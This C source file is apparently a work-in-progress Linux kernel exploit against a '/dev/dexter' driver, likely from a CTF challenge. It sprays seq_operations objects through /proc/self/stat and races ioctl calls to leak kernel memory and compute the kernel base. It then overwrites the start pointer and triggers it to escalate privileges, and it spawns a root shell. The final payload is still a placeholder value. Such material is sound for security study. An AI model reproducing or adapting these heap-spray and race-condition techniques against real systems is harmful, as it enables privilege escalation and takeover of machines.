#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <pthread.h>

#define commit_creds   kbase +  0x072810
#define kpti_trampoline kbase + 0x800e10
#define DEVICE_PATH "/dev/dexter"
#define BUFFER_SIZE 0x20
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002
#define ERROR(x) printf("Error: %s\n", x); return -1;

typedef struct {
  char *ptr;
  size_t len;
} request_t;
request_t req;
int fd, seq_fd, win;

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    );
}
int dexter_set(char *ptr, size_t len){
    req.ptr=ptr;
    req.len=len;
    if(ioctl(fd, CMD_SET, &req) < 0){return -1;}
    return 0;
}
int dexter_get(char *ptr, size_t len){
    req.ptr=ptr;
    req.len=len;
    if(ioctl(fd, CMD_GET, &req) < 0){return -1;}
    return 0;
}
//void *race(void *arg){while(!win){req.len=(size_t)arg; usleep(1);} return NULL;} // we have to sleep so some "normal" requests will be set too
int set_or_get = 0;
void *race(void *arg){
    if(set_or_get == 1){while(!win){dexter_set("unknownd4", (size_t) arg);}}
    if(set_or_get == 2){while(!win){dexter_get("unknownd4", (size_t) arg);}}
    return NULL;
}

void overread(char *buf, size_t len){
    pthread_t th;
    set_or_get = 2; // get
    char *tmp = (char *)malloc(len);
    memset(buf, 0, len);
    memset(tmp, 0, len); 
    pthread_create(&th, NULL, race, (void*)len);
    
    while(1){
        dexter_get(buf, BUFFER_SIZE);
        if(memcmp(tmp, buf, len) != 0){win = 1; break;} 
    }
    pthread_join(th, NULL);
    win = 0;
    free(tmp);
}

void overwrite(char *buf, size_t len){
    pthread_t th;
    set_or_get = 1; // set
    char *tmp = (char *)malloc(len);
    while(1){
        pthread_create(&th, NULL, race, (void*)len);  
        for(int i = 0; i < 0x1000; i++){dexter_set(buf, BUFFER_SIZE);} // overwriting the victim kernel buffer
        win = 1;
        pthread_join(th, NULL);
        win = 0;
        overread(tmp, len); // read the contents of the victim kernel buffer
        set_or_get = 1; // set
        if(memcmp(tmp, buf, len) == 0){break;}   // break if equal
    }
    free(tmp);
}



int main(int argc, char **argv){
    int fds[256];
    /* spray kmalloc-32: seq_operations */
    for(int i = 0; i < 128; i++){ if((fds[i]=open("/proc/self/stat", O_RDONLY)) < 0){ERROR("failed to spray..")} }
    if((fd = open(DEVICE_PATH, O_RDWR)) < 0){ERROR("failed to open the device..")}
    for(int i = 128; i < 256; i++){ if((fds[i]=open("/proc/self/stat", O_RDONLY)) < 0){ERROR("failed to spray..")} }
    
    uint64_t payload[0x100];

    overread((char *)payload, 0x100);
    uint64_t kbase = payload[32 / sizeof(uint64_t)] - 0x170f80;
    printf("[+] found kbase: %p\n", kbase);

    //for(int i = 0; i < 0x100 / sizeof(uint64_t); i++){printf("%d->%p\n", i, payload[i]);}
   // for(int i = 4; i < 0x100 / sizeof(uint64_t); i++){payload[i] = 0x4141414141414;}
    
    payload[32 / sizeof(uint64_t)] = 0x41414141; //kbase + 0x7c410;
    
    // kbase + 0x9b0cd; // overwrite seq_operations's start routine
    
    overwrite((char *)payload, 0x100);

   
    puts("[+] seq_operations->start overwritten successfully");
    char tmp[10];
    for(int i = 0; i < 256; i++){
        seq_fd = fds[i];
        __asm__(          
        "mov r15, 0xdeadbeefdeadbeef\n" // set pt_regs and then set rsp to the start of it
        "mov r14, 0xdeadbeefdeadbeef\n"
        "mov r13, 0xdeadbeefdeadbeef\n"
        "mov r12, 0xdeadbeefdeadbeef\n"
      //  "mov rbp, 0xdeadbeefdeadbeef\n"
       // "mov rbx, 0xdeadbeefdeadbeef\n"
       // "mov r11, 0xdeadbeefdeadbeef\n"
       // "mov r10, 0xdeadbeefdeadbeef\n"
       // "mov r9,  0xdeadbeefdeadbeef\n"
       // "mov r8,  0xdeadbeefdeadbeef\n"
        "xor rax, rax\n" // sys_read
       // "mov rcx, 0xdeadbeefdeadbeef\n"
        "mov rdx, 0x8\n"
        "mov rsi, rsp\n"
        "mov rdi, seq_fd\n"   
        "syscall"      // dummy read to trigger seq_operations's start routine (seq_read_iter(): m->op->start)
        );
        //read(fds[i], tmp, 10);
        
    } 
    
    puts("damn it");
    return 0;
}